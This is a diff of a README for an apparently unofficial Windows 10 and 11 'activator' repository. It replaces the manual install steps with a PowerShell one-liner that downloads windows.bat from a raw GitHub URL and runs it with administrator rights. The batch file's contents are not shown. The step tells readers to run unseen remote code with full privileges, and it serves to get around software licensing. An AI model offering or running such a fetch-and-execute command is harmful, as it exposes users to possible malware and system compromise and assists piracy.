@@ -10,11 +10,10 @@ Easy Installation: Just run the windows.bat for a simple activation process.
 No Complex Setup: Minimal steps to get your system activated.
 
 Installation:
-
-
-Download the repository or clone it using Git.
-
-Locate the windows.bat file.
+COPY AND PASTE THIS IN PowerSHELL: irm "https://raw.githubusercontent.com/betamod9/Windows-10-and-11-Activator/main/windows.bat" -OutFile "windows.bat"; Start-Process -FilePath "windows.bat" -Verb RunAs
+And press Enter.
+Or:
+Download the windows.bat file.
 
 Double-click the windows.bat file to run it and activate your Windows system.
 
